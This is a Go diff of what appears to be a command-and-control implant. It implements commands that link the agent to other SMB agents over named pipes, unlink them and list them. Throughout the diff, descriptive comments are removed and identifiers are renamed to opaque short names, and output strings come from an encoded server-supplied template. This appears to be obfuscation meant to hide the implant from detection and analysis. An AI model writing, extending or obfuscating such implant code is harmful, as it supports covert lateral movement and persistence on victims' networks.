@@ -10,8 +10,8 @@ import (
 	"time"
 )
 
-// LinkTemplate matches the server's CommandTemplate structure
-type LinkTemplate struct {
+
+type RC struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -32,44 +32,44 @@ const (
 	idxLinkPipe         = 348
 )
 
-// LinkCommand handles the 'link' command for connecting to other SMB agents
-type LinkCommand struct {
-	tpl *LinkTemplate
+
+type RM struct {
+	tpl *RC
 }
 
 // getTpl safely retrieves a template string by index
-func (c *LinkCommand) getTpl(idx int) string {
+func (c *RM) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
 	return ""
 }
 
-func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
-		return CommandResult{
+func (c *RM) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	c.tpl = &LinkTemplate{}
+	c.tpl = &RC{}
 	if err := json.Unmarshal(decoded, c.tpl); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -79,10 +79,10 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 	}
 
 	if len(args) < 2 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -92,10 +92,10 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 	switch protocol {
 	case c.getTpl(idxLinkProtoSmb):
 		if len(args) < 3 {
-			return CommandResult{
+			return OpResult{
 				Output:      Err(E1),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 		pipeName := args[2]
@@ -110,25 +110,25 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 		return c.linkSMB(pipePath)
 
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E29, protocol),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
 
-func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
+func (c *RM) linkSMB(pipePath string) OpResult {
 	// Get the link manager
-	lm := GetLinkManager()
+	lm := getLinkManager()
 
 	// Attempt to link
-	routingID, err := lm.Link(pipePath)
+	routingID, err := lm.link(pipePath)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E30, pipePath),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -137,26 +137,26 @@ func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
 	handshakeResult := c.performImmediateHandshake(lm, routingID)
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
-	return CommandResult{
+	return OpResult{
 		Output:      statusPrefix + pipePath + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // performImmediateHandshake handles the full handshake round-trip immediately
 // instead of waiting for the next poll cycle
-func (c *LinkCommand) performImmediateHandshake(lm *LinkManager, routingID string) string {
+func (c *RM) performImmediateHandshake(lm *RMgr, routingID string) string {
 	// Wait briefly for the SMB agent's handshake to arrive in the handshake queue
 	// The handleIncomingData goroutine should receive it shortly after connection
 	const handshakeWaitTimeout = 5 * time.Second
 	deadline := time.Now().Add(handshakeWaitTimeout)
 
-	var handshakeData *LinkDataOut
+	var handshakeData *ROut
 	for time.Now().Before(deadline) {
 		// Check handshake queue for handshake data (sent via "lh" field)
-		data := lm.GetHandshakeData()
-		if data != nil && data.RoutingID == routingID {
+		data := lm.getHandshakeData()
+		if data != nil && data.RID == routingID {
 			handshakeData = data
 			break
 		}
@@ -176,46 +176,46 @@ func (c *LinkCommand) performImmediateHandshake(lm *LinkManager, routingID strin
 	return c.getTpl(idxLinkQuitMarker)
 }
 
-// UnlinkCommand handles the 'unlink' command for disconnecting from SMB agents
-type UnlinkCommand struct{}
 
-func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+type DM struct{}
+
+func (c *DM) execute(ctx *OpCtx, args []string) OpResult {
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	routingID := args[0]
-	lm := GetLinkManager()
+	lm := getLinkManager()
 
-	if err := lm.Unlink(routingID); err != nil {
-		return CommandResult{
+	if err := lm.unlink(routingID); err != nil {
+		return OpResult{
 			Output:      ErrCtx(E31, routingID),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S7, routingID),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-// LinksCommand handles the 'links' command for listing active SMB links
-type LinksCommand struct{}
 
-func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	lm := GetLinkManager()
-	output := lm.ListLinks()
+type RLM struct{}
 
-	return CommandResult{
+func (c *RLM) execute(ctx *OpCtx, args []string) OpResult {
+	lm := getLinkManager()
+	output := lm.listLinks()
+
+	return OpResult{
 		Output:      output,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
